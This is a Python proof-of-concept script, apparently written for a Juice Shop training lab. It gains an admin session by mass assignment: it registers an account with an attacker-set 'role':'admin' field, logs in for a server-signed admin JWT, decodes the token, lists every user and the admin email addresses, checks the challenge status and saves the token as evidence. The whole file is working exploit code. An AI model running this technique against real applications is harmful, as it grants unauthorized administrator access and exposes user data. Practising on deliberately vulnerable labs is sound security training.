#!/usr/bin/env python3
"""
c07 (no-SQLi) — Gain an admin-session token WITHOUT any SQL injection.

Vector: Mass Assignment on user registration (CWE-915)
  POST /api/Users  { "email":..., "password":..., "role":"admin" }
  -> server persists attacker-controlled `role` field -> new account has admin role
  -> POST /rest/user/login -> genuine, server-signed RS256 JWT with data.role == "admin"

No SQL syntax is used anywhere in this PoC.
"""
import json, base64, time, sys
import urllib.request, urllib.error

BASE = "http://host.docker.internal:3000"
STAMP = str(int(time.time()))
EMAIL = f"c7admin{STAMP}@juice.sh"
PASSWORD = "P4ssw0rd-C7-noSQLi!"
OUT = "/workspace/evidence/c7_no_sqli_token.txt"


def req(method, path, body=None, token=None):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, method=method)
    r.add_header("Content-Type", "application/json")
    if token:
        r.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def b64d(s):
    s += "=" * (-len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))


def main():
    print(f"[*] target   : {BASE}")
    print(f"[*] identity : {EMAIL}")

    print("\n[1] Register with mass-assigned admin role")
    st, body = req("POST", "/api/Users",
                   {"email": EMAIL, "password": PASSWORD,
                    "passwordRepeat": PASSWORD, "role": "admin"})
    print(f"    HTTP {st}: {body[:300]}")
    if st not in (200, 201):
        print("[!] registration failed — aborting"); sys.exit(1)

    print("\n[2] Log in as the newly registered account")
    st, body = req("POST", "/rest/user/login", {"email": EMAIL, "password": PASSWORD})
    print(f"    HTTP {st}")
    if st != 200:
        print(f"[!] login failed: {body[:300]}"); sys.exit(1)
    token = json.loads(body)["authentication"]["token"]

    hdr, pl, _sig = token.split(".")
    print("    header :", json.dumps(b64d(hdr)))
    print("    payload:", json.dumps(b64d(pl)))

    role = b64d(pl).get("data", {}).get("role")
    uid = b64d(pl).get("data", {}).get("id")
    print(f"    -> role={role!r} id={uid!r}")
    if role != "admin":
        print("[!] server stripped the role — mass assignment not exploitable here")
        sys.exit(1)

    print("\n[3] Prove the token acts as admin on a privileged endpoint")
    st, body = req("GET", "/api/Users", token=token)
    users = json.loads(body)["data"] if st == 200 else []
    print(f"    GET /api/Users -> HTTP {st}, {len(users)} users returned")
    admins = [u["email"] for u in users if u.get("role") == "admin"]
    print(f"    admin accounts visible: {admins}")

    print("\n[4] Challenge status: 'Admin Registration' solved?")
    st, body = req("GET", "/api/Challenges/?key=registerAdminChallenge", token=token)
    try:
        ch = json.loads(body)["data"][0]
        print(f"    HTTP {st} solved={ch.get('solved')}")
    except Exception:
        print(f"    HTTP {st} {body[:200]}")

    print("\n[5] Control: token with a tampered signature must be rejected")
    bad = ".".join([hdr, pl, "AAAA" + _sig[4:]])
    st2, _ = req("GET", "/api/Users", token=bad)
    print(f"    tampered-signature token -> HTTP {st2}")

    with open(OUT, "w") as f:
        f.write(token + "\n")
    print(f"\n[+] admin-session token saved to {OUT}")


if __name__ == "__main__":
    main()
